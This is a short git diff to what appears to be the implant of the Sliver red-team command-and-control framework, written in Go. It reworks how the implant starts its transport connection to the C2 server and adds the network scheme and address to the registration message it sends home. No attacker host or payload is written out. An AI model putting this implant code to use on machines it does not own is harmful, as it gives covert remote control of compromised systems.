@@ -148,18 +148,19 @@ func main() {
 	svc.Run("", &sliverService{})
 	// {{else}}
 	for {
-		connection := transports.StartConnectionLoop()
-		if connection == nil {
+		err := transports.Transports.Init()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error starting transports: %s", err.Error())
+			// {{end}}
 			break
 		}
-		mainLoop(connection)
+		mainLoop(transports.Transports.Server.C2)
 	}
 	// {{end}}
 }
 
 func mainLoop(connection *transports.Connection) {
-
-	connection.Send <- getRegisterSliver() // Send registration information
 
 	// Reconnect active pivots
 	pivots.ReconnectActivePivots(connection)
@@ -277,6 +278,9 @@ func getRegisterSliver() *sliverpb.Envelope {
 		Filename:          filename,
 		ActiveC2:          transports.GetActiveC2(),
 		ReconnectInterval: uint32(transports.GetReconnectInterval() / time.Second),
+		// Network & transport information.
+		Network:       transports.Transports.Server.URL.Scheme,
+		RemoteAddress: transports.Transports.Server.Conn.LocalAddr().String(),
 	})
 	if err != nil {
 		// {{if .Config.Debug}}
